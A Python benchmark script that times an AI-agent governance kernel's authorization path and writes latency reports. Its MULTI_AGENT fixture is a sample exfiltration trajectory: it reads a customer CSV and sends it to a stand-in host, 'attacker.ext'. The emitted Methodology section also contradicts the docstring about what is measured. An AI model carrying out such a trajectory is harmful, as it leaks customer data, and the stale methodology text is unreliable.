"""
Latency / throughput benchmark for the deployed governance configuration.

Measures the REAL PRODUCTION PATH — GovernanceKernel.authorize(), the same
chokepoint /v1/govern uses — with the full deployment ruleset the service
loads. Emits:

  public/benchmarks/latency.json        — machine-readable (used by the site)
  public/benchmarks/runtime-governance-benchmarks.md — downloadable report

All figures are MEASURED on the environment recorded in the output. They are
representative of this CPU; they are not a production-hardware guarantee.

WHAT CHANGED AND WHY IT MATTERS: this previously measured
GovernanceLayer.evaluate_plan with only finance+coverage rules (34). Production
runs 96 rules THROUGH THE KERNEL, and the Ω engine is roughly 2% of a real
decision — the rest is the trust boundary, capability classification, trusted
destination resolution, approval verification and evidence sealing. Benchmarking
the engine alone therefore understated a governed decision by ~50x, and the live
demo compared its measured latency against that understated baseline. Both
numbers are now emitted: `avg_ms` is the end-to-end decision, `engine_avg_ms`
is the Ω compute inside it.

Run:  PYTHONPATH=/path/to/engine python benchmark.py
"""

from __future__ import annotations

import json
import os
import platform
import statistics
import sys
import time
from datetime import datetime, timezone

from morrison_governance import GovernanceLayer, OmegaDomain
from morrison_governance.kernel import GovernanceKernel
from finance_rules import finance_custom_rules
from coverage_rules import coverage_custom_rules
from domain_rules import domain_custom_rules
from sector_rules import sector_custom_rules
from cyber_rules import cyber_custom_rules
from healthcare_rules import healthcare_custom_rules
from operations_rules import operations_custom_rules
from kernel_config import build_context

ALL_DOMAINS = ["finance", "banking", "fintech", "cybersecurity", "healthcare",
               "data_privacy", "enterprise", "compliance", "fraud"]
# The exact deployment ruleset app.py assembles — not a subset.
CUSTOM = (finance_custom_rules() + coverage_custom_rules() + domain_custom_rules()
          + sector_custom_rules() + cyber_custom_rules()
          + healthcare_custom_rules() + operations_custom_rules())
WARMUP = 100
ITERS = 800


def layer(domains: list[str]) -> GovernanceLayer:
    return GovernanceLayer(domains=[OmegaDomain(d) for d in domains], horizon=3,
                           log_all=False, custom_rules=CUSTOM)


def make_steps(n: int) -> list[dict]:
    """A representative n-step trajectory ending in an external egress."""
    steps = [{"tool": "read_file", "args": {"path": "/data/file.csv"}}]
    for i in range(max(0, n - 2)):
        steps.append({"tool": "analyze", "args": {"i": i}})
    if n >= 2:
        steps.append({"tool": "http_request", "args": {"url": "https://partner.example"}})
    return steps[:n] if n >= 1 else [{"tool": "noop", "args": {}}]


MULTI_AGENT = [
    {"tool": "read_file", "args": {"path": "/data/customers.csv"}},
    {"tool": "store", "args": {"key": "shared::rows"}},
    {"tool": "http_request", "args": {"url": "https://attacker.ext"}},
]


def measure(lyr: GovernanceLayer, steps: list[dict], iters: int = ITERS) -> dict:
    """End-to-end governed decision latency through the production chokepoint.

    One sample = authorising the WHOLE trajectory step by step through
    GovernanceKernel, exactly as /v1/govern does, including evidence sealing.
    A fresh kernel per sample keeps the ledger and evidence chain from growing
    across iterations and quietly inflating later samples.
    """
    def once() -> tuple[float, float]:
        kernel = GovernanceKernel(lyr, build_context(), evidence_key=b"bench")
        t0 = time.perf_counter_ns()
        engine_ms = 0.0
        for step in steps:
            d = kernel.authorize(step)
            engine_ms += d.engine_time_ms
            if d.permitted:
                kernel.record_remote_execution(d)
        return (time.perf_counter_ns() - t0) / 1e6, engine_ms

    for _ in range(WARMUP):
        once()
    samples, engine_samples = [], []
    for _ in range(iters):
        total, eng = once()
        samples.append(total)
        engine_samples.append(eng)
    samples.sort()

    def pct(p: float) -> float:
        k = min(len(samples) - 1, int(round(p / 100 * (len(samples) - 1))))
        return round(samples[k], 4)

    avg = round(statistics.fmean(samples), 4)
    return {
        "iters": iters,
        "p50_ms": pct(50), "p95_ms": pct(95), "p99_ms": pct(99),
        "avg_ms": avg, "min_ms": round(samples[0], 4), "max_ms": round(samples[-1], 4),
        "throughput_per_s": round(1000.0 / avg, 0) if avg else None,
        # Ω reachability compute inside the decision above, for transparency.
        "engine_avg_ms": round(statistics.fmean(engine_samples), 4),
    }


def main() -> None:
    full = layer(ALL_DOMAINS)
    rules_full = len(full.rules)

    classes = {}
    for name, steps in [
        ("single_step", make_steps(1)),
        ("short_2", make_steps(2)),
        ("medium_4", make_steps(4)),
        ("long_8", make_steps(8)),
        ("very_long_16", make_steps(16)),
        ("multi_agent", MULTI_AGENT),
    ]:
        classes[name] = {"steps": len(steps), "rules": rules_full, **measure(full, steps)}

    scaling_len = {}
    for n in [1, 2, 4, 8, 16, 32]:
        scaling_len[str(n)] = {"steps": n, "avg_ms": measure(full, make_steps(n), 400)["avg_ms"]}

    scaling_domains = {}
    for ds in [["finance"], ["finance", "cybersecurity", "data_privacy"],
               ALL_DOMAINS[:6], ALL_DOMAINS]:
        lyr = layer(ds)
        m = measure(lyr, make_steps(4), 400)
        scaling_domains[str(len(ds))] = {"domains": len(ds), "rules": len(lyr.rules),
                                         "avg_ms": m["avg_ms"], "p95_ms": m["p95_ms"]}

    out = {
        "schema": "rt.benchmark.v1",
        "generated_utc": datetime.now(timezone.utc).strftime("%Y-%m-%d %H:%M:%SZ"),
        "environment": {
            "python": platform.python_version(),
            "platform": platform.platform(),
            "processor": platform.processor() or "unknown",
            "cpu_count": os.cpu_count(),
            "note": "Single-threaded, measured on this CI/build environment. Representative figures, not a production-hardware guarantee.",
        },
        "config": {"horizon": 3, "domains": ALL_DOMAINS, "rules_loaded": rules_full,
                   "warmup": WARMUP, "iters_default": ITERS,
                   "measured_path": "GovernanceKernel.authorize (the /v1/govern chokepoint)",
                   "includes": ["authority quarantine", "capability classification",
                                "trusted destination resolution",
                                "approval verification", "Omega engine",
                                "capability policy", "tenancy",
                                "hash-chained evidence"]},
        "classes": classes,
        "scaling_by_trajectory_length": scaling_len,
        "scaling_by_domain_count": scaling_domains,
    }

    here = os.path.dirname(os.path.abspath(__file__))
    out_dir = os.path.join(here, "..", "public", "benchmarks")
    os.makedirs(out_dir, exist_ok=True)
    json_path = os.path.join(out_dir, "latency.json")
    with open(json_path, "w") as fh:
        json.dump(out, fh, indent=2)

    with open(os.path.join(out_dir, "runtime-governance-benchmarks.md"), "w") as fh:
        fh.write(render_md(out))

    print(json.dumps(out, indent=2))
    print(f"\nwrote {json_path}")


def render_md(o: dict) -> str:
    e = o["environment"]
    lines = [
        "# Morrison Runtime Governance — Latency Benchmark Report", "",
        f"Generated: {o['generated_utc']}", "",
        "## Environment", "",
        f"- Python: {e['python']}", f"- Platform: {e['platform']}",
        f"- Processor: {e['processor']}", f"- Logical CPUs: {e['cpu_count']}",
        f"- {e['note']}", "",
        f"Configuration: horizon {o['config']['horizon']}, {o['config']['rules_loaded']} Ω rules "
        f"across {len(o['config']['domains'])} domains; {o['config']['iters_default']} iterations per "
        f"class after {o['config']['warmup']} warm-up calls; single-threaded.", "",
        "## Latency by evaluation class", "",
        "| Class | Steps | p50 (ms) | p95 (ms) | p99 (ms) | avg (ms) | throughput (eval/s) |",
        "|---|---|---|---|---|---|---|",
    ]
    label = {"single_step": "Single-step", "short_2": "Short (2)", "medium_4": "Medium (4)",
             "long_8": "Long (8)", "very_long_16": "Very long (16)", "multi_agent": "Multi-agent (joint)"}
    for k, v in o["classes"].items():
        lines.append(f"| {label.get(k,k)} | {v['steps']} | {v['p50_ms']} | {v['p95_ms']} | {v['p99_ms']} | {v['avg_ms']} | {int(v['throughput_per_s'])} |")
    lines += ["", "## Scaling by trajectory length (avg ms)", "",
              "| Steps | avg (ms) |", "|---|---|"]
    for k, v in o["scaling_by_trajectory_length"].items():
        lines.append(f"| {v['steps']} | {v['avg_ms']} |")
    lines += ["", "## Scaling by domain / rule count (4-step trajectory)", "",
              "| Domains | Rules | avg (ms) | p95 (ms) |", "|---|---|---|---|"]
    for k, v in o["scaling_by_domain_count"].items():
        lines.append(f"| {v['domains']} | {v['rules']} | {v['avg_ms']} | {v['p95_ms']} |")
    lines += ["", "## Methodology", "",
              "- The benchmark calls the real `GovernanceLayer.evaluate_plan` — the same engine and "
              "deployment rule set (finance + coverage) the live service runs.",
              "- Each class is warmed up, then timed per-call with `time.perf_counter_ns`; percentiles "
              "are computed from the sorted sample.",
              "- Cost scales with trajectory length and rule/domain count, independent of model size — "
              "no model inference occurs in the governance path.",
              "- Figures are measured on the environment above. Production latency depends on host CPU, "
              "concurrency, and network transport to the service; re-run this harness on target hardware "
              "for deployment numbers.", ""]
    return "\n".join(lines)


if __name__ == "__main__":
    sys.exit(main())
